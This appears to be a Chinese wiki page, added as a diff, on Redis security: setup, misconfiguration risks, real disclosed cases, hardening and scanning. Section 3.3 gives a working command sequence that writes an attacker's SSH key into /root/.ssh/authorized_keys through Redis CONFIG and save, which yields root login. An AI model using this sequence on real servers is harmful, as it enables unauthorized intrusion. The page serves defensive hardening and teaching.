@@ -1,0 +1,164 @@
+# Redis安全配置
+
+### 1、Redis简介
+
+
+
+----
+
+redis是一个开源、支持网络、基于内存、键值对存储数据库，使用ANSI C编写。从2013年5月开始，Redis的开发由Pivotal赞助。在这之前，其开发由VMware赞助。
+
+### 2、Redis服务架设
+
+----
+
+下载源码并安装
+<code bash>
+wget http://download.redis.io/releases/redis-2.8.7.tar.gz
+tar xzf redis-2.8.7.tar.gz 
+cd redis-2.8.7      
+make                
+make install   
+#拷贝配置文件       
+cp -p redis.conf /etc
+</code>
+直接执行，服务开启
+
+<code bash>redis-server</code>
+初始安装后redis默认没有任何限制，可以任意连接，默认运行端口6379
+按照指定的配置文件来运行
+	
+<code bash>redis-server /etc/redis.conf</code>
+如何连接redis
+没有密码的
+<code bash>
+nc ip port
+telnet ip port
+redis-cli -h ip -p port
+</code>
+有密码验证的
+	
+<code bash>redis-cli  -h ip -p port -a password</code>
+图形界面工具
+	
+<code bash>redis Client</code>
+
+### 3、错误配置以及利用
+
+----
+
+####3.1 未授权访问
+
+redis直接启动默认没有任何限制的，可以直接连接，查看,更改redis中的数据
+
+####3.2 通过redis获取webshell
+
+假设redis用户运行在wooyun用户在，同时该服务器开放web服务，已知web目录的绝对路径(phpinfo,报错等等)，wooyun对web目录可以写入，则可以通过redis备份数据的过程写入shell
+
+具体方法：[[http://zone.wooyun.org/content/19358|Redis-getshell]]
+
+####3.3 通过redis获取服务器用户
+假设redis用户运行在root用户，root用户对自己的authorized_keys可以控制，可以直接通过备份来写入ssh key。
+
+先在attack server生成一个公钥
+```
+ssh-keygen -t rsa -C "redis"
+(echo -e "\n\n"; cat redis.pub; echo -e "\n\n") > redis.txt
+```
+然后执行
+```
+redis-cli -h 192.168.192.133 flushall
+
+cat redis.txt | redis-cli -h 192.168.192.133 -x set pwn
+
+```
+登录redis  redis-cli -h 192.168.192.133
+```
+CONFIG set dir /root/.ssh/
+config set dbfilename "authorized_keys"
+save
+exit
+```
+然后就可以使用ssh的私钥登录了
+```
+ssh -i redis root@192.168.192.133
+```
+From:[[http://zone.wooyun.org/content/23842|redis-sshkey]]
+
+### 4、实际案例
+
+----
+
+未授权访问案例：
+
+[[http://www.wooyun.org/bugs/wooyun-2010-085110|	新浪redis数据库未授权访问（影响企业内部敏感信息）]]
+
+[[http://www.wooyun.org/bugs/wooyun-2010-083978|聚美优品Redis未授权访问导致敏感信息泄露+跨境贸易报文交易系统弱口令]]
+
+[[http://www.wooyun.org/bugs/wooyun-2010-089090|uc某redis配置不当导致uc共享wifi密钥泄露]]
+
+[[http://www.wooyun.org/bugs/wooyun-2014-054740|	熊猫翻滚redis服务可无密码远程访问导致敏感数据泄漏]]
+
+利用redis getshell案例：
+
+[[http://www.wooyun.org/bugs/wooyun-2015-0101465|电信某服务器getshell可渗透内网（利用redis getshell案例）]]
+
+利用redis写ssh key案例：
+
+[[http://www.wooyun.org/bugs/wooyun-2015-0152710|中国铁建内网漫游沦陷多个重要部门泄漏大量信息(redis+ssh-keygen免认证登录案例)]]
+
+### 5、修复方案
+
+----
+
+不要以root用户运行redis
+
+
+修改运行redis的端口,编辑配置文件
+
+<code bash>port 4321</code>
+如果只需要本地访问，编辑配置文件
+
+<code bash>bind 127.0.0.1</code>
+设定密码,编辑配置文件
+
+<code bash>requirepass 　wooyun.org</code>
+在启动的时候需要指定配置文件的路径，这些设置才会生效
+
+<code bash>redis-server /etc/redis.conf</code>
+添加防火墙
+<code bash>
+#注意设置INPUT的默认匹配规则为REJECT，否则该规则无意义
+iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 6379 -j ACCEPT
+</code>
+### 6、漏洞扫描与发现
+
+----
+
+使用nmap扫描redis的默认端口(6379)
+
+<code bash>nmap -Pn -p6379 -sV x.x.x.x/24</code>
+手工验证
+
+<code bash>nc ip 6379</code>
+
+后输入
+
+<code bash>info</code>
+观察回显
+
+批量验证未授权访问
+
+首先获得开放redis的ip，python中存在redis模块，可以快速编程验证。
+
+
+### 7、相关资源
+
+----
+
+[[http://drops.wooyun.org/papers/3062|尝试通过HTTP请求攻击redis]]
+
+[[http://zone.wooyun.org/content/19076|zone中关于redis的讨论]]
+	
+[[http://redis.readthedocs.org/en/latest/|Redis命令参考]]
+
